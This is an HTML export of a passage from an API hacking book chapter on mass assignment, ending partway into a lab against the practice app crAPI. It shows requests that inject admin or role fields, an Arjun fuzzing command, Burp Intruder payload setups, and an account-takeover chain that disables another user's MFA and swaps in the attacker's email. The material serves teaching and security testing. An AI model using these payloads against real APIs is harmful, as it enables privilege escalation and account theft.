<html><head><meta content="text/html; charset=UTF-8" http-equiv="content-type"><style type="text/css">ol.lst-kix_qg1ho6836rti-1.start{counter-reset:lst-ctn-kix_qg1ho6836rti-1 0}.lst-kix_qg1ho6836rti-5>li:before{content:"" counter(lst-ctn-kix_qg1ho6836rti-5,lower-roman) ". "}.lst-kix_qg1ho6836rti-1>li{counter-increment:lst-ctn-kix_qg1ho6836rti-1}.lst-kix_qg1ho6836rti-4>li:before{content:"" counter(lst-ctn-kix_qg1ho6836rti-4,lower-latin) ". "}.lst-kix_qg1ho6836rti-8>li:before{content:"" counter(lst-ctn-kix_qg1ho6836rti-8,lower-roman) ". "}.lst-kix_qg1ho6836rti-7>li{counter-increment:lst-ctn-kix_qg1ho6836rti-7}ol.lst-kix_qg1ho6836rti-3.start{counter-reset:lst-ctn-kix_qg1ho6836rti-3 0}.lst-kix_qg1ho6836rti-7>li:before{content:"" counter(lst-ctn-kix_qg1ho6836rti-7,lower-latin) ". "}.lst-kix_qg1ho6836rti-4>li{counter-increment:lst-ctn-kix_qg1ho6836rti-4}.lst-kix_qg1ho6836rti-6>li:before{content:"" counter(lst-ctn-kix_qg1ho6836rti-6,decimal) ". "}ol.lst-kix_qg1ho6836rti-7{list-style-type:none}ol.lst-kix_qg1ho6836rti-8{list-style-type:none}ol.lst-kix_qg1ho6836rti-8.start{counter-reset:lst-ctn-kix_qg1ho6836rti-8 0}ol.lst-kix_qg1ho6836rti-4.start{counter-reset:lst-ctn-kix_qg1ho6836rti-4 0}.lst-kix_qg1ho6836rti-0>li:before{content:"" counter(lst-ctn-kix_qg1ho6836rti-0,decimal) ". "}.lst-kix_qg1ho6836rti-1>li:before{content:"" counter(lst-ctn-kix_qg1ho6836rti-1,lower-latin) ". "}.lst-kix_qg1ho6836rti-3>li:before{content:"" counter(lst-ctn-kix_qg1ho6836rti-3,decimal) ". "}ol.lst-kix_qg1ho6836rti-6.start{counter-reset:lst-ctn-kix_qg1ho6836rti-6 0}.lst-kix_qg1ho6836rti-2>li:before{content:"" counter(lst-ctn-kix_qg1ho6836rti-2,lower-roman) ". "}.lst-kix_qg1ho6836rti-8>li{counter-increment:lst-ctn-kix_qg1ho6836rti-8}ol.lst-kix_qg1ho6836rti-7.start{counter-reset:lst-ctn-kix_qg1ho6836rti-7 0}.lst-kix_qg1ho6836rti-5>li{counter-increment:lst-ctn-kix_qg1ho6836rti-5}ol.lst-kix_qg1ho6836rti-0.start{counter-reset:lst-ctn-kix_qg1ho6836rti-0 0}.lst-kix_qg1ho6836rti-2>li{counter-increment:lst-ctn-kix_qg1ho6836rti-2}li.li-bullet-0:before{margin-left:-18pt;white-space:nowrap;display:inline-block;min-width:18pt}.lst-kix_qg1ho6836rti-3>li{counter-increment:lst-ctn-kix_qg1ho6836rti-3}ol.lst-kix_qg1ho6836rti-5{list-style-type:none}.lst-kix_qg1ho6836rti-0>li{counter-increment:lst-ctn-kix_qg1ho6836rti-0}ol.lst-kix_qg1ho6836rti-6{list-style-type:none}ol.lst-kix_qg1ho6836rti-3{list-style-type:none}ol.lst-kix_qg1ho6836rti-4{list-style-type:none}ol.lst-kix_qg1ho6836rti-1{list-style-type:none}ol.lst-kix_qg1ho6836rti-2{list-style-type:none}ol.lst-kix_qg1ho6836rti-5.start{counter-reset:lst-ctn-kix_qg1ho6836rti-5 0}.lst-kix_qg1ho6836rti-6>li{counter-increment:lst-ctn-kix_qg1ho6836rti-6}ol.lst-kix_qg1ho6836rti-0{list-style-type:none}ol.lst-kix_qg1ho6836rti-2.start{counter-reset:lst-ctn-kix_qg1ho6836rti-2 0}ol{margin:0;padding:0}table td,table th{padding:0}.c2{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.75;border-left-width:0pt;border-top-style:solid;background-color:#ffffff;text-indent:12pt;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c5{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.5;border-left-width:0pt;border-top-style:solid;background-color:#ffffff;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c12{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.75;border-left-width:0pt;border-top-style:solid;background-color:#ffffff;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c17{border-right-style:solid;padding-top:6pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.125;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c18{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.5;border-left-width:0pt;border-top-style:solid;border-left-style:solid;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c13{border-right-style:solid;padding-top:0pt;border-top-width:0pt;border-right-width:0pt;padding-left:0pt;padding-bottom:0pt;line-height:1.75;border-top-style:solid;background-color:#ffffff;margin-left:54pt;border-bottom-width:0pt;border-bottom-style:solid;orphans:2;widows:2;text-align:left;padding-right:0pt}.c21{background-color:#ffffff;-webkit-text-decoration-skip:none;color:#d3002d;font-weight:400;text-decoration:underline;text-decoration-skip-ink:none;font-size:9pt;font-family:"Times New Roman";font-style:italic}.c15{-webkit-text-decoration-skip:none;color:#d3002d;font-weight:400;text-decoration:underline;text-decoration-skip-ink:none;font-size:12pt;font-family:"Times New Roman";font-style:italic}.c7{background-color:#eef2f6;color:#3d3b49;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:"Courier New";font-style:normal}.c25{background-color:#ffffff;color:#3d3b49;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:40.5pt;font-family:"Times New Roman";font-style:normal}.c22{background-color:#ffffff;color:#3d3b49;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:54pt;font-family:"Times New Roman";font-style:normal}.c0{background-color:#ffffff;color:#3d3b49;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:9pt;font-family:"Times New Roman";font-style:italic}.c20{color:#3d3b49;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:23.5pt;font-family:"Times New Roman";font-style:normal}.c8{color:#3d3b49;font-weight:400;text-decoration:none;vertical-align:baseline;font-size:12pt;font-family:"Times New Roman";font-style:normal}.c16{color:#3d3b49;font-weight:700;text-decoration:none;vertical-align:baseline;font-size:14.5pt;font-family:"Times New Roman";font-style:normal}.c6{padding-top:24pt;padding-bottom:24pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c3{padding-top:0pt;padding-bottom:0pt;line-height:1.15;orphans:2;widows:2;text-align:left}.c10{padding-top:18pt;padding-bottom:18pt;line-height:1.5;orphans:2;widows:2;text-align:left}.c4{background-color:#eef2f6;font-size:12pt;font-family:"Courier New";color:#3d3b49;font-weight:700}.c1{background-color:#eef2f6;font-size:12pt;font-family:"Courier New";color:#188038;font-weight:400}.c27{background-color:#000000;color:#ffffff;font-weight:700;font-size:23.5pt;font-family:"Times New Roman"}.c14{background-color:#eef2f6;font-size:12pt;font-family:"Courier New";color:#3d3b49;font-weight:400}.c29{color:#000000;font-weight:400;font-size:11pt;font-family:"Arial"}.c9{font-size:12pt;font-family:"Times New Roman";color:#3d3b49;font-weight:400}.c23{background-color:#ffffff;max-width:468pt;padding:72pt 72pt 72pt 72pt}.c26{text-decoration:none;vertical-align:baseline;font-style:normal}.c19{color:inherit;text-decoration:inherit}.c24{padding:0;margin:0}.c28{font-style:italic}.c11{height:11pt}.title{padding-top:0pt;color:#000000;font-size:26pt;padding-bottom:3pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}.subtitle{padding-top:0pt;color:#666666;font-size:15pt;padding-bottom:16pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}li{color:#000000;font-size:11pt;font-family:"Arial"}p{margin:0;color:#000000;font-size:11pt;font-family:"Arial"}h1{padding-top:20pt;color:#000000;font-size:20pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h2{padding-top:18pt;color:#000000;font-size:16pt;padding-bottom:6pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h3{padding-top:16pt;color:#434343;font-size:14pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h4{padding-top:14pt;color:#666666;font-size:12pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h5{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;orphans:2;widows:2;text-align:left}h6{padding-top:12pt;color:#666666;font-size:11pt;padding-bottom:4pt;font-family:"Arial";line-height:1.15;page-break-after:avoid;font-style:italic;orphans:2;widows:2;text-align:left}</style></head><body class="c23 doc-content"><h1 class="c18" id="h.4kmybq1s7cus"><span class="c22">11</span></h1><h1 class="c18" id="h.4kmybq1s7cus-1"><span class="c25">MASS ASSIGNMENT</span></h1><p class="c6"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 610.67px; height: 800.00px;"><img alt="" src="images/image6.png" style="width: 610.67px; height: 800.00px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c12"><span class="c8">An API is vulnerable to mass assignment if the consumer is able to send a request that updates or overwrites server-side variables. If an API accepts client input without filtering or sanitizing it, an attacker can update objects with which they shouldn&rsquo;t be able to interact. For example, a banking API might allow users to update the email address associated with their account, but a mass assignment vulnerability might let the user send a request that updates their account balance as well.</span></p><p class="c2"><span class="c8">In this chapter, we&rsquo;ll discuss strategies for finding mass assignment targets and figuring out which variables the API uses to identify sensitive data. Then we&rsquo;ll discuss automating your mass assignment attacks with Arjun and Burp Suite Intruder.</span></p><h2 class="c5" id="h.lhy7ji8ws3y"><span class="c20">Finding Mass Assignment Targets</span></h2><p class="c12"><span class="c8">One of the most common places to discover and exploit mass assignment vulnerabilities is in API requests that accept and process client input. Account registration, profile editing, user management, and client management are all common functions that allow clients to submit input using the API.</span></p><h3 class="c5" id="h.u5vhc9v8a444"><span class="c16">Account Registration</span></h3><p class="c12"><span class="c8">Likely the most frequent place you&rsquo;ll look for mass assignment is in account registration processes, as these might allow you to register as an administrative user. If the registration process relies on a web application, the end user would fill in standard fields with information such as their desired username, email address, phone number, and account password. Once the user clicks the submit button, an API request like the following would be sent:</span></p><p class="c3"><span class="c7">POST /api/v1/register</span></p><p class="c3"><span class="c7">--snip--</span></p><p class="c3"><span class="c7">{</span></p><p class="c3"><span class="c7">&quot;username&quot;:&quot;hAPI_hacker&quot;,</span></p><p class="c3"><span class="c7">&quot;email&quot;:&quot;hapi@hacker.com&quot;,</span></p><p class="c3"><span class="c7">&quot;password&quot;:&quot;Password1!&quot;</span></p><p class="c10"><span class="c7">}</span></p><p class="c2"><span class="c8">For most end users, this request takes place in the background, leaving them none the wiser. However, since you&rsquo;re an expert at intercepting web application traffic, you can easily capture and manipulate it. Once you&rsquo;ve intercepted a registration request, check whether you can submit additional values in the request. A common version of this attack is to upgrade an account to an administrator role by adding a variable that the API provider likely uses to identify admins:</span></p><p class="c3"><span class="c7">POST /api/v1/register</span></p><p class="c3"><span class="c7">--snip--</span></p><p class="c3"><span class="c7">{</span></p><p class="c3"><span class="c7">&quot;username&quot;:&quot;hAPI_hacker&quot;,</span></p><p class="c3"><span class="c7">&quot;email&quot;:&quot;hapi@hacker.com&quot;,</span></p><p class="c3"><span class="c7">&quot;admin&quot;: true,</span></p><p class="c3"><span class="c7">&quot;password&quot;:&quot;Password1!&quot;</span></p><p class="c10"><span class="c7">}</span></p><p class="c2"><span class="c8">If the API provider uses this variable to update account privileges on the backend and accepts additional input from the client, this request will turn the account being registered into an admin-level account.</span></p><h3 class="c5" id="h.rn8eugq90uwf"><span class="c16">Unauthorized Access to Organizations</span></h3><p class="c12"><span class="c9">Mass assignment attacks go beyond making attempts to become an administrator. You could also use mass assignment to gain unauthorized access to other organizations, for instance. If your user objects include an organizational group that allows access to company secrets or other sensitive information, you can attempt to gain access to that group. In this example, we&rsquo;ve added an </span><span class="c1">&quot;org&quot;</span><span class="c8">&nbsp;variable to our request and turned its value into an attack position we could then fuzz in Burp Suite:</span></p><p class="c3"><span class="c7">POST /api/v1/register</span></p><p class="c3"><span class="c7">--snip--</span></p><p class="c3"><span class="c7">{</span></p><p class="c3"><span class="c7">&quot;username&quot;:&quot;hAPI_hacker&quot;,</span></p><p class="c3"><span class="c7">&quot;email&quot;:&quot;hapi@hacker.com&quot;,</span></p><p class="c3"><span class="c4">&quot;org&quot;: &quot;&sect;CompanyA&sect;&quot;,</span></p><p class="c3"><span class="c7">&quot;password&quot;:&quot;Password1!&quot;</span></p><p class="c10"><span class="c7">}</span></p><p class="c2"><span class="c9">If you can assign yourself to other organizations, you will likely be able to gain unauthorized access to the other group&rsquo;s resources. To perform such an attack, you&rsquo;ll need to know the names or IDs used to identify the companies in requests. If the </span><span class="c1">&quot;org&quot;</span><span class="c8">&nbsp;value was a number, you could brute-force its value, like when testing for BOLA, to see how the API responds.</span></p><p class="c2"><span class="c8">Do not limit your search for mass assignment vulnerabilities to the account registration process. Other API functions are capable of being vulnerable. Test other endpoints used for resetting passwords; updating account, group, or company profiles; and any other plays where you may be able to assign yourself additional access.</span></p><h2 class="c5" id="h.8na8pf2zjwj3"><span class="c20">Finding Mass Assignment Variables</span></h2><p class="c12"><span class="c8">The challenge with mass assignment attacks is that there is very little consistency in the variables used between APIs. That being said, if the API provider has some method for, say, designating accounts as administrator, you can be sure that they also have some convention for creating or updating variables to make a user an administrator. Fuzzing can speed up your search for mass assignment vulnerabilities, but unless you understand your target&rsquo;s variables, this technique can be a shot in the dark.</span></p><h3 class="c5" id="h.rdgf953ude0h"><span class="c16">Finding Variables in Documentation</span></h3><p class="c12"><span class="c8">Begin by looking for sensitive variables in the API documentation, especially in sections focused on privileged actions. In particular, the documentation can give you a good indication of what parameters are included within JSON objects.</span></p><p class="c2"><span class="c8">For example, you might search for how a low-privileged user is created compared to how an administrator account is created. Submitting a request to create a standard user account might look something like this:</span></p><p class="c3"><span class="c7">POST /api/create/user</span></p><p class="c3"><span class="c14">Token: </span><span class="c4">LowPriv-User</span></p><p class="c3"><span class="c7">--snip--</span></p><p class="c3"><span class="c7">{</span></p><p class="c3"><span class="c7">&quot;username&quot;: &quot;hapi_hacker&quot;,</span></p><p class="c3"><span class="c7">&quot;pass&quot;: &quot;ff7ftw&quot;</span></p><p class="c10"><span class="c7">}</span></p><p class="c2"><span class="c8">Creating an admin account might look something like the following:</span></p><p class="c3"><span class="c14">POST /api/</span><span class="c4">admin</span><span class="c7">/create/user</span></p><p class="c3"><span class="c14">Token: </span><span class="c4">AdminToken</span></p><p class="c3"><span class="c7">--snip--</span></p><p class="c3"><span class="c7">{</span></p><p class="c3"><span class="c7">&quot;username&quot;: &quot;adminthegreat&quot;,</span></p><p class="c3"><span class="c7">&quot;pass&quot;: &quot;bestadminpw&quot;,</span></p><p class="c3"><span class="c4">&quot;admin&quot;: true</span></p><p class="c10"><span class="c7">}</span></p><p class="c2"><span class="c9">Notice that the admin request is submitted to an admin endpoint, uses an admin token, and includes the parameter </span><span class="c1">&quot;admin&quot;: true</span><span class="c9">. There are many fields related to admin account creation, but if the application doesn&rsquo;t handle the requests properly, we might be able to make an administrator account by simply adding the parameter </span><span class="c1">&quot;admin&quot;=true</span><span class="c8">&nbsp;to our user account request, as shown here:</span></p><p class="c3"><span class="c7">POST /create/user</span></p><p class="c3"><span class="c7">Token: LowPriv-User</span></p><p class="c3"><span class="c7">--snip--</span></p><p class="c3"><span class="c7">{</span></p><p class="c3"><span class="c7">&quot;username&quot;: &quot;hapi_hacker&quot;,</span></p><p class="c3"><span class="c7">&quot;pass&quot;: &quot;ff7ftw&quot;,</span></p><p class="c3"><span class="c4">&quot;admin&quot;: true</span></p><p class="c10"><span class="c7">}</span></p><h3 class="c5" id="h.5w7kf7dv5kcz"><span class="c16">Fuzzing Unknown Variables</span></h3><p class="c12"><span class="c8">Another common scenario is that you&rsquo;ll perform an action in a web application, intercept the request, and locate several bonus headers or parameters within it, like so:</span></p><p class="c3"><span class="c7">POST /create/user</span></p><p class="c3"><span class="c7">--snip--</span></p><p class="c3"><span class="c7">{</span></p><p class="c3"><span class="c7">&quot;username&quot;: &quot;hapi_hacker&quot;</span></p><p class="c3"><span class="c7">&quot;pass&quot;: &quot;ff7ftw&quot;,</span></p><p class="c3"><span class="c4">&quot;uam&quot;: 1,</span></p><p class="c3"><span class="c4">&quot;mfa&quot;: true,</span></p><p class="c3"><span class="c4">&quot;account&quot;: 101</span></p><p class="c10"><span class="c7">}</span></p><p class="c2"><span class="c9">Parameters used in one part of an endpoint might be useful for exploiting mass assignment using a different endpoint. When you don&rsquo;t understand the purpose of a certain parameter, it&rsquo;s time to put on your lab coat and experiment. Try fuzzing by setting </span><span class="c1">uam</span><span class="c9">&nbsp;to zero, </span><span class="c1">mfa</span><span class="c9">&nbsp;to false, and </span><span class="c1">account</span><span class="c8">&nbsp;to every number between 0 and 101, and then watch how the provider responds. Better yet, try a variety of inputs, such as those discussed in the previous chapter. Build up your wordlist with the parameters you collect from an endpoint and then flex your fuzzing skills by submitting requests with those parameters included. Account creation is a great place to do this, but don&rsquo;t limit yourself to it.</span></p><h3 class="c5" id="h.1n8uj9pkh6fq"><span class="c16">Blind Mass Assignment Attacks</span></h3><p class="c12"><span class="c8">If you cannot find variable names in the locations discussed, you could perform a blind mass assignment attack. In such an attack, you&rsquo;ll attempt to brute-force possible variable names through fuzzing. Send a single request with many possible variables, like the following, and see what sticks:</span></p><p class="c3"><span class="c7">POST /api/v1/register</span></p><p class="c3"><span class="c7">--snip--</span></p><p class="c3"><span class="c7">{</span></p><p class="c3"><span class="c7">&quot;username&quot;:&quot;hAPI_hacker&quot;,</span></p><p class="c3"><span class="c7">&quot;email&quot;:&quot;hapi@hacker.com&quot;,</span></p><p class="c3"><span class="c7">&quot;admin&quot;: true,</span></p><p class="c3"><span class="c7">&quot;admin&quot;:1,</span></p><p class="c3"><span class="c7">&quot;isadmin&quot;: true,</span></p><p class="c3"><span class="c7">&quot;role&quot;:&quot;admin&quot;,</span></p><p class="c3"><span class="c7">&quot;role&quot;:&quot;administrator&quot;,</span></p><p class="c3"><span class="c7">&quot;user_priv&quot;: &quot;admin&quot;,</span></p><p class="c3"><span class="c7">&quot;password&quot;:&quot;Password1!&quot;</span></p><p class="c10"><span class="c7">}</span></p><p class="c2"><span class="c8">If an API is vulnerable, it might ignore the irrelevant variables and accept the variable that matches the expected name and format.</span></p><h2 class="c5" id="h.8n8qcasw2e72"><span class="c20">Automating Mass Assignment Attacks with Arjun and Burp Suite Intruder</span></h2><p class="c12"><span class="c9">As with many other API attacks, you can discover mass assignment by manually altering an API request or by using a tool such as Arjun for parameter fuzzing. As you can see in the following Arjun request, we&rsquo;ve included an authorization token with the </span><span class="c1">&ndash;headers</span><span class="c9">&nbsp;option, specified JSON as the format for the request body, and identified the exact attack spot that Arjun should test with </span><span class="c1">$arjun$</span><span class="c8">:</span></p><p class="c3"><span class="c14">$ </span><span class="c4">arjun --headers &quot;Content-Type: application/json]&quot; -u http://vulnhost.com/api/register -m JSON --include=&#39;{$arjun$}&#39;</span></p><p class="c3 c11"><span class="c7"></span></p><p class="c3"><span class="c7">[~] Analysing the content of the webpage</span></p><p class="c3"><span class="c7">[~] Analysing behaviour for a non-existent parameter</span></p><p class="c3"><span class="c7">[!] Reflections: 0</span></p><p class="c3"><span class="c7">[!] Response Code: 200</span></p><p class="c3"><span class="c7">[~] Parsing webpage for potential parameters</span></p><p class="c3"><span class="c7">[+] Heuristic found a potential post parameter: admin</span></p><p class="c3"><span class="c7">[!] Prioritizing it</span></p><p class="c3"><span class="c7">[~] Performing heuristic level checks</span></p><p class="c3"><span class="c7">[!] Scan Completed</span></p><p class="c3"><span class="c7">[+] Valid parameter found: user</span></p><p class="c3"><span class="c7">[+] Valid parameter found: pass</span></p><p class="c10"><span class="c7">[+] Valid parameter found: admin</span></p><p class="c2"><span class="c8">As a result, Arjun will send a series of requests with various parameters from a wordlist to the target host. Arjun will then narrow down likely parameters based on deviations of response lengths and response codes and provide you with a list of valid parameters.</span></p><p class="c2"><span class="c9">Remember that if you run into issues with rate limiting, you can use the Arjun </span><span class="c1">&mdash;stable</span><span class="c9">&nbsp;option to slow down the scans. This sample scan completed and discovered three valid parameters: </span><span class="c1">user</span><span class="c9">, </span><span class="c1">pass</span><span class="c9">, and </span><span class="c1">admin</span><span class="c8">.</span></p><p class="c2"><span class="c8">Many APIs prevent you from sending too many parameters in a single request. As a result, you might receive one of several HTTP status codes in the 400 range, such as 400 Bad Request, 401 Unauthorized, or 413 Payload Too Large. In that case, instead of sending a single large request, you could cycle through possible mass assignment variables over many requests. This can be done by setting up the request in Burp Suite&rsquo;s Intruder with the possible mass assignment values as the payload, like so:</span></p><p class="c3"><span class="c7">POST /api/v1/register</span></p><p class="c3"><span class="c7">--snip--</span></p><p class="c3"><span class="c7">{</span></p><p class="c3"><span class="c7">&quot;username&quot;:&quot;hAPI_hacker&quot;,</span></p><p class="c3"><span class="c7">&quot;email&quot;:&quot;hapi@hacker.com&quot;,</span></p><p class="c3"><span class="c4">&sect;&quot;admin&quot;: true&sect;,</span></p><p class="c3"><span class="c7">&quot;password&quot;:&quot;Password1!&quot;</span></p><p class="c10"><span class="c7">}</span></p><h2 class="c5" id="h.f1gklxlmnxz"><span class="c20">Combining BFLA and Mass Assignment</span></h2><p class="c12"><span class="c8">If you&rsquo;ve discovered a BFLA vulnerability that allows you to update other users&rsquo; accounts, try combining this ability with a mass assignment attack. For example, let&rsquo;s say a user named Ash has discovered a BFLA vulnerability, but the vulnerability only allows him to edit basic profile information such as usernames, addresses, cities, and regions:</span></p><p class="c3"><span class="c7">PUT /api/v1/account/update</span></p><p class="c3"><span class="c7">Token:UserA-Token</span></p><p class="c3"><span class="c7">--snip--</span></p><p class="c3"><span class="c7">{</span></p><p class="c3"><span class="c7">&quot;username&quot;: &quot;Ash&quot;,</span></p><p class="c3"><span class="c7">&quot;address&quot;: &quot;123 C St&quot;,</span></p><p class="c3"><span class="c7">&quot;city&quot;: &quot;Pallet Town&quot;</span></p><p class="c3"><span class="c7">&quot;region&quot;: &quot;Kanto&quot;,</span></p><p class="c10"><span class="c7">}</span></p><p class="c2"><span class="c8">At this point, Ash could deface other user accounts, but not much more. However, performing a mass assignment attack with this request could make the BFLA finding much more significant. Let&rsquo;s say that Ash analyzes other GET requests in the API and notices that other requests include parameters for email and multifactor authentication (MFA) settings. Ash knows that there is another user, named Brock, whose account he would like to access.</span></p><p class="c2"><span class="c8">Ash could disable Brock&rsquo;s MFA settings, making it easier to gain access to Brock&rsquo;s account. Moreover, Ash could replace Brock&rsquo;s email with his own. If Ash were to send the following request and get a successful response, he could gain access to Brock&rsquo;s account:</span></p><p class="c3"><span class="c7">PUT /api/v1/account/update</span></p><p class="c3"><span class="c7">Token:UserA-Token</span></p><p class="c3"><span class="c7">--snip--</span></p><p class="c3"><span class="c7">{</span></p><p class="c3"><span class="c7">&quot;username&quot;: &quot;Brock&quot;,</span></p><p class="c3"><span class="c7">&quot;address&quot;: &quot;456 Onyx Dr&quot;,</span></p><p class="c3"><span class="c7">&quot;city&quot;: &quot;Pewter Town&quot;,</span></p><p class="c3"><span class="c7">&quot;region&quot;: &quot;Kanto&quot;,</span></p><p class="c3"><span class="c7">&quot;email&quot;: &quot;ash@email.com&quot;,</span></p><p class="c3"><span class="c7">&quot;mfa&quot;: false</span></p><p class="c10"><span class="c7">}</span></p><p class="c2"><span class="c9">Since Ash does not know Brock&rsquo;s current password, Ash should leverage the API&rsquo;s process for performing a password reset, which would likely be a PUT or POST request sent to </span><span class="c9 c28">/api/v1/account/reset</span><span class="c8">. The password reset process would then send a temporary password to Ash&rsquo;s email. With MFA disabled, Ash would be able to use the temporary password to gain full access to Brock&rsquo;s account.</span></p><p class="c2"><span class="c8">Always remember to think as an adversary would and take advantage of every opportunity.</span></p><h2 class="c5" id="h.w4ehy07qspfl"><span class="c20">Summary</span></h2><p class="c12"><span class="c8">If you encounter a request that accepts client input for sensitive variables and allows you to update those variables, you have a serious finding on your hands. As with other API attacks, sometimes a vulnerability may seem minor until you&rsquo;ve combined it with other interesting findings. Finding a mass assignment vulnerability is often just the tip of the iceberg. If this vulnerability is present, chances are that other vulnerabilities are present.</span></p><h2 class="c5" id="h.wzqqjun547ze"><span class="c26 c27">Lab #8: Changing the Price of Items in an Online Store</span></h2><p class="c12"><span class="c8">Armed with our new mass assignment attack techniques, let&rsquo;s return to crAPI. Consider what requests accept client input and how we could leverage a rogue variable to compromise the API. Several of the requests in your crAPI Postman collection appear to allow client input:</span></p><ol class="c24 lst-kix_qg1ho6836rti-0 start" start="1"><li class="c13 li-bullet-0"><span class="c1 c26">POST /identity/api/auth/signup</span></li><li class="c13 li-bullet-0"><span class="c1 c26">POST /workshop/api/shop/orders</span></li><li class="c13 li-bullet-0"><span class="c1 c26">POST /workshop/api/merchant/contact_mechanic</span></li></ol><p class="c2"><span class="c8">It&rsquo;s worth testing each of these once we&rsquo;ve decided what variable to add to them.</span></p><p class="c2"><span class="c9">We can locate a sensitive variable in the GET request to the </span><span class="c9 c28">/workshop/api/shop/products</span><span class="c9">&nbsp;endpoint, which is responsible for populating the crAPI storefront with products. Using Repeater, notice that the GET request loads a JSON variable called </span><span class="c1">&quot;credit&quot;</span><span class="c9">&nbsp;(see </span><span class="c15"><a class="c19" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c11.xhtml%23figure11-1&amp;sa=D&amp;source=editors&amp;ust=1681144495826943&amp;usg=AOvVaw2iAaeeWrJmliVtLDlvYmH-">Figure 11-1</a></span><span class="c8">). That seems like an interesting variable to manipulate.</span></p><p class="c6"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 624.00px; height: 422.67px;"><img alt="screenshot of burp suite&rsquo;s repeater that shows the request to get /workshop/api/shop/products. the response loads a json variable &ldquo;credit&rdquo;:50.0" src="images/image1.png" style="width: 624.00px; height: 422.67px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c17"><span class="c21">Figure 11-1</span><span class="c0">: Using Burp Suite Repeater to analyze the /workshop/api/shop/products endpoint</span></p><p class="c2"><span class="c9">This request already provides us with a potential variable to test (</span><span class="c1">credit</span><span class="c8">), but we can&rsquo;t actually change the credit value using a GET request. Let&rsquo;s run a quick Intruder scan to see if we can leverage any other request methods with this endpoint. Right-click the request in Repeater and send it to Intruder. Once in Intruder, set the attack position to the request method:</span></p><p class="c10"><span class="c7">&sect;GET&sect; /workshop/api/shop/products HTTP/1.1</span></p><p class="c2"><span class="c9">Let&rsquo;s update the payloads with the request methods we want to test for: PUT, POST, HEAD, DELETE, CONNECT, PATCH, and OPTIONS (see </span><span class="c15"><a class="c19" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c11.xhtml%23figure11-2&amp;sa=D&amp;source=editors&amp;ust=1681144495828246&amp;usg=AOvVaw1Sr72DRDYKmwdFL8EC5690">Figure 11-2</a></span><span class="c8">).</span></p><p class="c2"><span class="c9">Start the attack and review the results. You&rsquo;ll notice that crAPI will respond to restricted methods with a 405 Method Not Allowed status code, which means the 400 Bad Request response we received in response to the POST request is pretty interesting (see </span><span class="c15"><a class="c19" href="https://www.google.com/url?q=https://learning.oreilly.com/library/view/hacking-apis/9781098130244/c11.xhtml%23figure11-3&amp;sa=D&amp;source=editors&amp;ust=1681144495828709&amp;usg=AOvVaw2DDux7mq2wR7gNsxWATyoR">Figure 11-3</a></span><span class="c8">). This 400 Bad Request likely indicates that crAPI is expecting a different payload to be included in the POST request.</span></p><p class="c6"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 429.33px; height: 413.33px;"><img alt="screenshot of burp suite&rsquo;s payloads window that includes the payload options put, post, head, delete, connect, patch, and options and has space to enter new items" src="images/image3.png" style="width: 429.33px; height: 413.33px; margin-left: 0.00px; margin-top: 0.00px; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px);" title=""></span></p><p class="c17"><span class="c21">Figure 11-2</span><span class="c0">: Burp Suite Intruder request methods with payloads</span></p><p class="c6"><span style="overflow: hidden; display: inline-block; margin: 0.00px 0.00px; border: 0.00px solid #000000; transform: rotate(0.00rad) translateZ(0px); -webkit-transform: rotate(0.00rad) translateZ(0px); width: 498.67px; height: 666.67px;"><img alt="screenshot of burp suite&rsquo;s intruder results that shows 200, 405, and 400 statuses for various 